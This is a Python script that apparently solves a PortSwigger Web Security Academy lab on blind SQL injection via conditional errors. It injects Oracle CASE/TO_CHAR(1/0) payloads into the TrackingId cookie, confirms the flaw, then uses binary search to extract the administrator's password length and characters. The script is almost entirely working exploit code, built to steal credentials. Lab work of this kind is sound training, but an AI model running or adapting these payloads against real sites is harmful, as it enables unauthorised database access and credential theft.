import string
import requests


# Configuration
Lab_URL = "https://0a2a000e03c3a29f80d817390087009a.web-security-academy.net/"
BASE_TRACKING_ID = "OckvjRqfXWbEoGia"
SESSION_COOKIE = "GIrsGftCixx8beSLz6P05R29seRah1eT"

HOST  = Lab_URL.replace("https://","").replace("http://","").rstrip("/")

headers = {
    "Host": HOST,
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "User-Agent": (
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)"
        " Chrome/154.0.0.0 Safari/537.36"
    ),
    "Origin": Lab_URL.rstrip("/"),
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
}


def send_req(payload):
    cookies = {
      "TrackingId": BASE_TRACKING_ID + payload,
      "session": SESSION_COOKIE,
    }
    try:
        response = requests.get(
            Lab_URL, headers=headers, cookies=cookies, timeout=10
            )
        return response.status_code == 500
    except requests.exceptions.RequestException as e:
        print(f"[-] Request Error: {e}")
        return False


def test_vulnerability():
    print("[*] Testing for Blind SQL Injection via Conditional Errors vulnerability")

    payload = "' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a"
    payload2 = "' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a"

    first_result = send_req(payload)

    second_result = send_req(payload2)

    if not first_result and second_result:
        return True
    else:
        return False

    return not payload


def get_password_length():
    print("[*] Testing for Password Length...")

    h = 50
    l = 1

    while h >= l:
        m = (h + l) // 2

        gt_payload = (
            f"' AND (SELECT CASE WHEN ((SELECT LENGTH(password) FROM users"
            f" WHERE username = 'administrator') > {m}) THEN TO_CHAR(1/0)"
            f" ELSE 'a' END FROM dual) = 'a"
        )

        if send_req(gt_payload):
            l = m + 1
        else:
            eq_payload = (
                f"' AND (SELECT CASE WHEN ((SELECT LENGTH(password) FROM users"
                f" WHERE username = 'administrator') = {m}) THEN TO_CHAR(1/0)"
                f" ELSE 'a' END FROM dual) = 'a"
            )
            if send_req(eq_payload):
                print(f"[+] Password length found: {m}")
                return m
            else:
                h = m - 1

    print("[-] Could not determine password length.")
    return 0

def extract_password(password_length):
    print(f"[*] Extracting Password using Binary Search")

    chars = sorted(string.ascii_lowercase + string.digits + string.ascii_uppercase)

    password = ""
    for i in range(1,password_length+1):
        low = 0
        high = len(chars) - 1

        while low <= high:
            guessi = (low+high) // 2

            gt_payload = f"' AND (SELECT CASE WHEN ( (SUBSTR((SELECT password FROM users WHERE username = 'administrator'),{i},1)) < '{chars[guessi]}') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a"

            if send_req(gt_payload) :
                    high = guessi - 1
            else:
                eq_payload =  f"' AND (SELECT CASE WHEN ( (SUBSTR((SELECT password FROM users WHERE username = 'administrator'),{i},1)) = '{chars[guessi]}') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual) = 'a"


                if send_req(eq_payload) :
                    password +=  chars[guessi]
                    print(f"[+] Password: {password}")
                    break
                else:
                    low = guessi + 1
    return password


if __name__ == "__main__":
    if test_vulnerability():
        print(f"[+] Vulnerability Exists")

        password_length = get_password_length()
        if password_length > 0 :
            print (f"[+] Success! Password Length: {password_length}")
            admin_password = extract_password(password_length)
            print(f"\n[+] SUCCESS! Administrator password is: {admin_password}")
        else:
            print(f"[-] Exiting due to unknown password length.")
    else:
        print(f"[-] Exiting: Target is not vulberable or cookies/URL are incorrect.")
